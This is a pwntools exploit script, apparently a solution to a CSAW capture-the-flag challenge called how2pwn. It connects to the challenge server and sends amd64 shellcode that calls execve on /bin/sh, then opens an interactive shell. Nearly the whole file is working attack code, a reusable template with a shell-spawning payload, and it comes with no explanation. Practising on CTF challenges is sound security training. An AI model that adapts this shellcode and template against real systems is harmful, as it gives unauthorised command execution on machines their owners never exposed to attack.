#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./chal1')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('how2pwn.chal.csaw.io', 60001)
    libc = ELF('./libc.so.6')

sh = '''
    mov rax, 59
    mov rsi, 0
    mov rdx, 0
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    syscall
'''
p.sendlineafter(b'Enter your shellcode: \n', asm(sh))

p.interactive()

